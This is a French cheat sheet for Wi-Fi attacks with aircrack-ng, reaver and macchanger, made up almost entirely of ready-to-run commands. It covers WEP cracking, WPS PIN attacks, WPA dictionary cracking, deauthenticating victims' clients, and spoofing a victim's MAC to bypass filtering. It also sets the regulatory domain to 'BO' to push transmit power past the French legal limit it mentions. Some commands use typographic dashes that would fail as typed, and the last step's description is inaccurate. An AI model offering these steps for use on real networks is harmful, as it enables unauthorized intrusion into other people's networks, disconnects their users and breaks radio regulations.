
# Cheat sheet AIRCRACK-NG

## Nécessite une carte pouvant être passer en mode monitor.

### Ouvrir le mode moniteur

 ifconfig wlan0mon down
 
 iwconfig wlan0mon mode monitor
 
 ifconfig wlan0mon up
#### modifier "wlan0mon" par le nom de votre carte si celle-ci est différent

### Augmenter la puissance de transmission Wi-Fi


 iw reg set BO
 iwconfig wlan0 txpower <NmW|NdBm|off|auto>
 iwconfig
#### On peut le mettre à 30 mais la limite légal en France est de 20.

### Changer de canal WiFi
 iwconfig wlan0 channel <SetChannel(1-14)>
 
#### Permet d'éviter les interférences avec d'autres réseaux sans fil et optimiser les performances

## CRACKING WEP
### Méthode 1 : Attaque par authentification factice
#### Cette technique attaque permet à l'attaquant de se faire passer  pour un client légitime en utilisant une authentification factice afin de s'associer avec un point d'accès sans fournir la clé WEP correcte. Ce qui est possible car le protocole WEP ne vérifie pas l'intégrité des adresses MAC pendant le processus d'authentification

 macchanger --show wlan0mon
 
#### Utilisation de macchanger pour afficher l'adresse MAC actuelle de l'interface réseau en mode moniteur (wlan0mon)
# Lancement des attaques
 aireplay-ng -1 0 -a BSSID -h OurMac -e ESSID wlan0mon
#### Permet de faire croire au point d'accès que vous êtes un client autorisé.
 
 aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b BSSID -h OurMac wlan0mon
#### Permet d'accumuler suffisamment de données pour briser la clé WEP 	


 aircrack-ng –b BSSID PCAP_of_FileName
#### Aircrack-ng va analyser les paquets capturés, utiliser les IVs pour casser la clé WEP. Le temps nécessaire dépend de plusieurs facteurs comme la puissance du signal, la quantité de trafic sur le réseau, et la vitesse de votre matériel


## CRACKING WPA / WPA2

### Méthode 1 : Attaque WPS

 apt-get install reaver
 #### Installe REAVER qui est un outil pour effectuer des attaques sur le WPS

 wash –i wlan0mon –C
 #### Permet de vérifier si le point d'accès cible a WPS activé et est vulnérable
 
 reaver –i wlan0mon –b <BSSID> -vv –S
 
#### Pour lancer l'attaque WPS et récupérer la clé WPA/WPA2.



### Méthode 2 : Attaque par dictionnaire

#### Aircrack-ng utilise une wordlist pour essayer de craquer la clé WPA/WPA2 à partir d'un handshake capturé.

 aircrack-ng –w <WordlistFile> -b <BSSID> <Handshaked_PCAP>


## TROUVER SSID CACHÉ


 aireplay-ng -0 20 –a <BSSID> -c <VictimMac> wlan0mon 
#####  Envoi 20 paquets de désauthentification pour forcer une reconnexion et capturer le SSID.

## CONTOURNEMENT DU FILTRAGE MAC


 aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
#### Déclenche une attaque de désauthentification pour déconnecter les clients autorisés. 
 
 ifconfig wlan0mon down
 macchanger –-mac <VictimMac> wlan0mon
 ifconfig wlan0mon up
#### Permet de changer l'adresse MAC de votre carte réseau pour correspondre à celle d'un client autorisé
 
 aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon

#### Permet de se connecter au réseau en se faisant passer pour le client autorisé.
